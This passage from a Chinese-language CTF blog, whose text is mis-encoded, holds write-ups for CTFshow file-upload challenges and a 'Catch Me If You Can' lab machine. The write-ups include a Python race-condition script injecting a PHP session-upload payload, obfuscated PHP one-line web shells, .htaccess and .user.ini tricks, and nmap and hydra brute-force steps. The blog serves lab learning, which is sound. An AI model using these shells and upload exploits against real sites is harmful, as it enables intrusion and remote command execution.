keyword">import</span> io<span class="token comment" spellcheck="true">#ioåº“</span><span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#requestsè·¯</span><span class="token keyword">import</span> threading<span class="token comment" spellcheck="true">#å¤šçº¿ç¨‹åº“</span>url <span class="token operator">=</span> <span class="token string">'http://2f7dadc0-f18d-41db-b727-61fd89b2d983.challenge.ctf.show:8080/'</span>sessid <span class="token operator">=</span> <span class="token string">'yn8rt'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#å†™å…¥å‡½æ•°</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#å½“äº‹ä»¶å¼€å¯</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">256</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#postå½¢å¼è®¿é—®</span>            url<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#urlä¸å˜</span>            cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#cookiesèµ‹å€¼</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php system("cat /f*");?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#æ–‡ä»¶å†…å®¹</span>            files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'harker.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#æ–‡ä»¶å½¢å¼</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#è¯»å–å‡½æ•°</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#å½“äº‹ä»¶å¼€å¯</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'upload/index.php'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sessid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ä»¥getå½¢å¼è®¿é—®</span>        <span class="token keyword">if</span> <span class="token string">'ctfshow'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#å¦‚æœå­˜åœ¨flagåˆ™æ‰“å°å‡ºå†…å®¹</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#å…³é—­äº‹ä»¶</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#è¾“å‡ºNO</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#å®šä¹‰äº‹ä»¶</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#å¼€å¯äº‹ä»¶</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># ä¸Šä¸‹æ–‡ç®¡ç†ï¼Œå¯ä»¥å¤„ç†å¼‚å¸¸</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># å¼€å¯çº¿ç¨‹</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># å¼€å¯çº¿ç¨‹</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web164-165ï¼ˆä¸å¼„ï¼‰"><a href="#web164-165ï¼ˆä¸å¼„ï¼‰" class="headerlink" title="web164-165ï¼ˆä¸å¼„ï¼‰"></a>web164-165ï¼ˆä¸å¼„ï¼‰</h2><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><h3 id="è€ƒç‚¹ï¼šé’ˆå¯¹zipæ–‡ä»¶æ ¡éªŒ"><a href="#è€ƒç‚¹ï¼šé’ˆå¯¹zipæ–‡ä»¶æ ¡éªŒ" class="headerlink" title="è€ƒç‚¹ï¼šé’ˆå¯¹zipæ–‡ä»¶æ ¡éªŒ"></a>è€ƒç‚¹ï¼šé’ˆå¯¹zipæ–‡ä»¶æ ¡éªŒ</h3><p>Content-Type: application/x-zip-compressed</p><p>ç„¶åzipæŠ“åŒ…ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥å°±è¡Œ</p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><h3 id="è€ƒç‚¹ï¼š-1"><a href="#è€ƒç‚¹ï¼š-1" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>.htaccessæ–‡ä»¶ï¼š</p><p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚<br>æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><pre><code>AddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp</code></pre><pre><code>&lt;FilesMatch &quot;666.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web169-170"><a href="#web169-170" class="headerlink" title="web169-170"></a>web169-170</h2><p>åˆ©ç”¨.user.ini</p><p>è¿›è¡ŒUAå¤´çš„æ—¥å¿—æ–‡ä»¶åŒ…å«</p><pre><code>auto_append_file=â€œ/var/log/nginx/access.logâ€</code></pre><p>æ­¤å¤„éœ€è¦ä¸Šä¼ zipæ–‡ä»¶ï¼Œç„¶åtypeç±»å‹ä¸ºimage/pngï¼Œæœ‰ç‚¹æ‰¯æ·¡</p><p>ç„¶åä¸Šä¼ 1.phpæ—¶ä¿®æ”¹UAå†™é©¬ï¼Œç„¶åèšå‰‘è¿æ¥/upload/1.phpå°±å¯ä»¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¹‹çŒ«é¼ æ¸¸æˆ</title>
      <link href="/2021/06/16/ctf-zhi-mao-shu-you-xi/"/>
      <url>/2021/06/16/ctf-zhi-mao-shu-you-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›®æ ‡å‘ç°ï¼š</p><pre><code>nmap -sP 192.168.10.0/24</code></pre><h3 id="Flag-1-â€œDonâ€™t-go-Home-Frank-Thereâ€™s-a-Hex-on-Your-Houseâ€"><a href="#Flag-1-â€œDonâ€™t-go-Home-Frank-Thereâ€™s-a-Hex-on-Your-Houseâ€" class="headerlink" title="Flag#1 - â€œDonâ€™t go Home Frank! Thereâ€™s a Hex on Your Houseâ€"></a>Flag#1 - â€œDonâ€™t go Home Frank! Thereâ€™s a Hex on Your Houseâ€</h3><p>æ ¸å¿ƒå•è¯ä¸ºhomeå’Œhexï¼Œä¹Ÿå°±æ˜¯åœ¨ä¸»é¡µæœ‰16è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ä¸²éœ€è¦ä½ æ¥æ‰¾ï¼Œä¸»è¦æœç´¢ç›®æ ‡ä¸ºjsæ–‡ä»¶</p><p>æ ¹æ®æºä»£ç é‡Œé¢çš„æ³¨é‡Šæ‰çš„æç¤ºï¼š</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">[</span>If IE4<span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"/oldIE/html5.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>Make sure to remove <span class="token keyword">this</span> before going to PROD<span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ç½‘é¡µåé¢è·Ÿè¸ª/oldIE/html5.jså¾—åˆ°ä¸€ä¸²å¯†æ–‡ï¼š</p><pre><code>666c61677b37633031333230373061306566373164353432363633653964633166356465657d</code></pre><p>ç„¶åè¿›è¡Œè§£ç å¾—åˆ°ï¼š</p><pre><code>echo &#39;666c61677b37633031333230373061306566373164353432363633653964633166356465657d&#39; | xxd -r(è§£ç ) -p(è¾“å‡º)flag{7c0132070a0ef71d542663e9dc1f5dee}md5å¤„ç†flag{nmap}</code></pre><h3 id="Flag-2-â€œObscurity-or-Security-That-is-the-Questionâ€-éšæ™¦æˆ–è€…å®‰å…¨ï¼Œè¿™æ˜¯ä¸€ä¸ªé—®é¢˜"><a href="#Flag-2-â€œObscurity-or-Security-That-is-the-Questionâ€-éšæ™¦æˆ–è€…å®‰å…¨ï¼Œè¿™æ˜¯ä¸€ä¸ªé—®é¢˜" class="headerlink" title="Flag#2 - â€œObscurity or Security? That is the Questionâ€(éšæ™¦æˆ–è€…å®‰å…¨ï¼Œè¿™æ˜¯ä¸€ä¸ªé—®é¢˜)"></a>Flag#2 - â€œObscurity or Security? That is the Questionâ€(éšæ™¦æˆ–è€…å®‰å…¨ï¼Œè¿™æ˜¯ä¸€ä¸ªé—®é¢˜)</h3><p>åˆ©ç”¨nmapé’ˆå¯¹æ­¤ç½‘ç«™è¿›è¡Œç«¯å£æ‰«æ</p><pre><code>nmap -sT -sV(å‰é¢éœ€è¦æœ‰sTæ¥æ£€æŸ¥å¼€æ”¾äº†å“ªäº›ç«¯å£) -p-(æ‰€æœ‰ç«¯å£çš„å¦ä¸€ç§è¡¨ç¤º) 192.168.10.129</code></pre><p>å¾—åˆ°80ã€443ã€22222ç«¯å£æ˜¯å¼€çš„ï¼Œè€Œ443ç«¯å£æ˜¯é’ˆå¯¹å®‰å…¨çš„è¿œç¨‹è¶…æ–‡æœ¬ä¼ è¾“åè®®ä¹Ÿå°±æ˜¯httpsï¼Œè¿™é‡Œçš„22222ç«¯å£ä¸ºsshå¯ä»¥å°è¯•</p><pre><code>ssh 192.168.10.129 -p 22222</code></pre><p>å‘Šè¯‰æˆ‘åªå…è®¸fbiæˆå‘˜æ‰å¯ä»¥è®¿é—®åŒæ—¶ä¹Ÿå¾—åˆ°</p><pre><code>Flag{53c82eba31f6d416f331de9162ebe997}encrypt(åŠ å¯†)</code></pre><h3 id="Flag-3-â€œBecare-agent-during-his-Travels-Frank-has-Been-Known-to-Intercept-Trafficâ€-æ³¨æ„è¯æ®åœ¨ä»–çš„æ—…è¡Œä¸­ï¼Œå¼—å…°å…‹ä»¥æ‹¦æˆªäº¤é€šè€Œé—»å"><a href="#Flag-3-â€œBecare-agent-during-his-Travels-Frank-has-Been-Known-to-Intercept-Trafficâ€-æ³¨æ„è¯æ®åœ¨ä»–çš„æ—…è¡Œä¸­ï¼Œå¼—å…°å…‹ä»¥æ‹¦æˆªäº¤é€šè€Œé—»å" class="headerlink" title="Flag#3 - â€œBecare agent during his Travels Frank has Been Known to Intercept Trafficâ€(æ³¨æ„è¯æ®åœ¨ä»–çš„æ—…è¡Œä¸­ï¼Œå¼—å…°å…‹ä»¥æ‹¦æˆªäº¤é€šè€Œé—»å)"></a>Flag#3 - â€œBecare agent during his Travels Frank has Been Known to Intercept Trafficâ€(æ³¨æ„è¯æ®åœ¨ä»–çš„æ—…è¡Œä¸­ï¼Œå¼—å…°å…‹ä»¥æ‹¦æˆªäº¤é€šè€Œé—»å)</h3><p>é‡ç‚¹åœ¨æ‹¦æˆªä¸Šï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨burpsuiteæ¥æŠ“åŒ…äº†ï¼Œå¹¶ä¸”æç¤ºagent</p><p>é€šè¿‡ä¸Šä¸€ä¸ªflagçš„åŠ å¯†æç¤ºå’Œå‡­è¯ï¼Œå¯ä»¥çŒœæµ‹åˆ°sslè¯ä¹¦ï¼Œä¹Ÿå°±æ˜¯HTTPSåè®®ä¸­çš„sslè¯ä¹¦ï¼Œç„¶åè¿›è¡Œè¿œç¨‹è¶…æ–‡æœ¬åŠ å¯†åè®®çš„è®¿é—®å‘ç°sslè¯ä¹¦æ˜¯ä¸å®‰å…¨çš„ï¼ŒæŸ¥çœ‹è¯ä¹¦åå‘ç°äº†flag</p><pre><code>flag3{f82366a9ddc064585d54e3f78bde3221}personnel(äººå‘˜)</code></pre><p>æŠ“åŒ…åœ¨è¿™é‡Œæ²¡èµ·åˆ°ä½œç”¨å¯èƒ½çŒœæƒ³æœ‰é”™è¯¯</p><h3 id="Flag-4-â€œA-Good-Agent-is-Hard-to-Findâ€-ä¸€ä¸ªå¥½çš„è¯æ®æ˜¯å¾ˆéš¾å‘ç°çš„"><a href="#Flag-4-â€œA-Good-Agent-is-Hard-to-Findâ€-ä¸€ä¸ªå¥½çš„è¯æ®æ˜¯å¾ˆéš¾å‘ç°çš„" class="headerlink" title="Flag#4 - â€œA Good Agent is Hard to Findâ€(ä¸€ä¸ªå¥½çš„è¯æ®æ˜¯å¾ˆéš¾å‘ç°çš„)"></a>Flag#4 - â€œA Good Agent is Hard to Findâ€(ä¸€ä¸ªå¥½çš„è¯æ®æ˜¯å¾ˆéš¾å‘ç°çš„)</h3><p>éœ€è¦åˆ©ç”¨personnel(ä¸ªäººä¿¡æ¯)</p><p>è®¿é—®ç½‘ç«™çš„å­ç›®å½•personnelå¾—åˆ°ï¼šACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Chargingâ€¦.(æ‹’ç»è®¿é—®ï¼ï¼ï¼ æ‚¨ä¼¼ä¹ä¸æ˜¯æ¥è‡ª FBI å·¥ä½œç«™ã€‚ å‡†å¤‡å®¡è®¯å®¤ 1. æ±½è½¦ç”µæ± å……ç”µâ€¦. )</p><p>è¿™é‡Œéœ€è¦FBIä¸ºè®¿é—®UA</p><p>é€šè¿‡html5.jsç»§ç»­æ”¶é›†ä¿¡æ¯å¾—åˆ°</p><pre><code>/* maindev -  6/7/02 Adding temporary(æš‚æ—¶çš„) support for IE4 FBI Workstations */</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8816%E6%97%A51516_1.png" alt></p><p>ä¿®æ”¹UAä¿¡æ¯ä¸ºMozilla/4.0 (compatible; MSIE 4.0; Windows NT 5.0)</p><p>ç„¶åå†æ¬¡æ”¾è¡Œå°±å¯ä»¥å¾—åˆ°æ–°çš„é¡µé¢äº†å¾—åˆ°</p><pre><code>flag{14e10d570047667f904261e6d08f520f}Clue(çº¿ç´¢) = new+flagevidence(è¯æ®)</code></pre><h3 id="Flag-5-â€œThe-Devil-is-in-the-Details-Or-is-it-Dialogue-Either-Way-if-itâ€™s-Simple-Guessable-or-Personal-it-Goes-Against-Best-Practicesâ€-é­”é¬¼åœ¨ç»†èŠ‚ä¸­â€”â€”è¿˜æ˜¯å¯¹è¯ï¼Ÿ-æ— è®ºå“ªç§æ–¹å¼ï¼Œå¦‚æœå®ƒæ˜¯ç®€å•çš„ã€å¯çŒœæµ‹çš„æˆ–ä¸ªæ€§åŒ–çš„ï¼Œå®ƒå°±ä¼šè¿èƒŒæœ€ä½³å®è·µ"><a href="#Flag-5-â€œThe-Devil-is-in-the-Details-Or-is-it-Dialogue-Either-Way-if-itâ€™s-Simple-Guessable-or-Personal-it-Goes-Against-Best-Practicesâ€-é­”é¬¼åœ¨ç»†èŠ‚ä¸­â€”â€”è¿˜æ˜¯å¯¹è¯ï¼Ÿ-æ— è®ºå“ªç§æ–¹å¼ï¼Œå¦‚æœå®ƒæ˜¯ç®€å•çš„ã€å¯çŒœæµ‹çš„æˆ–ä¸ªæ€§åŒ–çš„ï¼Œå®ƒå°±ä¼šè¿èƒŒæœ€ä½³å®è·µ" class="headerlink" title="Flag#5 - â€œThe Devil is in the Details - Or is it Dialogue? Either Way, if itâ€™s Simple, Guessable, or Personal it Goes Against Best Practicesâ€(é­”é¬¼åœ¨ç»†èŠ‚ä¸­â€”â€”è¿˜æ˜¯å¯¹è¯ï¼Ÿ æ— è®ºå“ªç§æ–¹å¼ï¼Œå¦‚æœå®ƒæ˜¯ç®€å•çš„ã€å¯çŒœæµ‹çš„æˆ–ä¸ªæ€§åŒ–çš„ï¼Œå®ƒå°±ä¼šè¿èƒŒæœ€ä½³å®è·µ )"></a>Flag#5 - â€œThe Devil is in the Details - Or is it Dialogue? Either Way, if itâ€™s Simple, Guessable, or Personal it Goes Against Best Practicesâ€(é­”é¬¼åœ¨ç»†èŠ‚ä¸­â€”â€”è¿˜æ˜¯å¯¹è¯ï¼Ÿ æ— è®ºå“ªç§æ–¹å¼ï¼Œå¦‚æœå®ƒæ˜¯ç®€å•çš„ã€å¯çŒœæµ‹çš„æˆ–ä¸ªæ€§åŒ–çš„ï¼Œå®ƒå°±ä¼šè¿èƒŒæœ€ä½³å®è·µ )</h3><p>new+flag=newevidence</p><p>è®¿é—®æ–°è¯æ®å­ç›®å½•å¾—åˆ°å¯¹è¯æ¡†</p><p>æŠ“åŒ…çˆ†ç ´å¯†ç (å·²ç»ç»™å‡ºå­—å…¸äº†)ï¼šcarl.hanratty:Grace</p><p>æˆåŠŸè¿›å…¥</p><pre><code>flag{117c240d49f54096413dd64280399ea9}panam(é’±)</code></pre><h3 id="Flag-6-â€œWhere-in-the-World-is-Frank-â€"><a href="#Flag-6-â€œWhere-in-the-World-is-Frank-â€" class="headerlink" title="Flag#6 - â€œWhere in the World is Frank?â€"></a>Flag#6 - â€œWhere in the World is Frank?â€</h3><p>åˆ©ç”¨å¾—åˆ°çš„å›¾ç‰‡è¿›è¡Œsteghideå¤„ç†</p><p>ä½¿ç”¨steghideå‘½ä»¤åˆ†æå›¾ç‰‡ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼šsteghide info xxx.jpg</p><p>å¯†ç å°±æ˜¯panamå¾—åˆ°æ–°çš„</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E9%98%BF%E8%90%A8%E5%BE%B7%E7%BE%A4%E7%BF%81.jpg" alt></p><h3 id="Flag-7-â€œFrank-Was-Caught-on-Camera-Cashing-Checks-and-Yelling-Iâ€™m-The-Fastest-Man-Alive-â€-å¼—å…°å…‹è¢«æ‘„åƒæœºæŠ“åˆ°å…‘ç°æ”¯ç¥¨å¹¶å¤§å–Šå¤§å«-æˆ‘æ˜¯æ´»ç€æœ€å¿«çš„äººï¼"><a href="#Flag-7-â€œFrank-Was-Caught-on-Camera-Cashing-Checks-and-Yelling-Iâ€™m-The-Fastest-Man-Alive-â€-å¼—å…°å…‹è¢«æ‘„åƒæœºæŠ“åˆ°å…‘ç°æ”¯ç¥¨å¹¶å¤§å–Šå¤§å«-æˆ‘æ˜¯æ´»ç€æœ€å¿«çš„äººï¼" class="headerlink" title="Flag#7 - â€œFrank Was Caught on Camera Cashing Checks and Yelling - Iâ€™m The Fastest Man Alive!â€(å¼—å…°å…‹è¢«æ‘„åƒæœºæŠ“åˆ°å…‘ç°æ”¯ç¥¨å¹¶å¤§å–Šå¤§å« - æˆ‘æ˜¯æ´»ç€æœ€å¿«çš„äººï¼)"></a>Flag#7 - â€œFrank Was Caught on Camera Cashing Checks and Yelling - Iâ€™m The Fastest Man Alive!â€(å¼—å…°å…‹è¢«æ‘„åƒæœºæŠ“åˆ°å…‘ç°æ”¯ç¥¨å¹¶å¤§å–Šå¤§å« - æˆ‘æ˜¯æ´»ç€æœ€å¿«çš„äººï¼)</h3><p>ç™¾åº¦ï¼Œå¾—åˆ°ç­”æ¡ˆæ˜¯é—ªç”µä¾ ï¼šBarry.Allen</p><p>åˆ©ç”¨æ­¤åå­—frankç»„æˆçˆ†ç ´å­—å…¸ï¼š</p><pre><code>barryallenbarry.allenBaryy.AllenBarryAllenbarryallenBarryAllencarl.hanrattyCarl.HanrattycarlhanrattycarlhanrattyCarlHanrattyFrank.Abagnalefrank.abagnalefrankabagnaleFrankAbagnalefrankabagnale</code></pre><p>passwdï¼š</p><pre><code>iheartbrendabarryallenbarry.allenBaryy.AllenBarryAllenbarryallenBarryAllencarl.hanrattyCarl.HanrattycarlhanrattycarlhanrattyCarlHanrattyFrank.Abagnalefrank.abagnalefrankabagnaleFrankAbagnalefrankabagnalepanamILoveFrance </code></pre><p>ç„¶ååˆ©ç”¨<a href="https://www.cnblogs.com/daiorz/p/11803131.html" target="_blank" rel="noopener">hydraå®ç°çˆ†ç ´</a>ï¼š</p><p>hydra -L (æŒ‡å®šå¤šä¸ªç”¨æˆ·åï¼Œå‚æ•°å€¼ä¸ºå­˜å‚¨ç”¨æˆ·åçš„æ–‡ä»¶çš„è·¯å¾„(å»ºè®®ä¸ºç»å¯¹è·¯å¾„)-P(æŒ‡å®šå•ä¸ªå¯†ç ï¼Œé€‚åˆåœ¨çŸ¥é“å¯†ç çˆ†ç ´ç”¨æˆ·åæ—¶ä½¿ç”¨)-s(æŒ‡å®šç«¯å£ï¼Œé€‚ç”¨äºæ”»å‡»ç›®æ ‡ç«¯å£éé»˜è®¤çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼šhttpæœåŠ¡ä½¿ç”¨é80ç«¯å£)22222 192.168.10.129 ssh</p><p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼šbarryallen&amp;iheartbrenda</p><p>ç„¶åsshè¿æ¥åˆ°ç›®æ 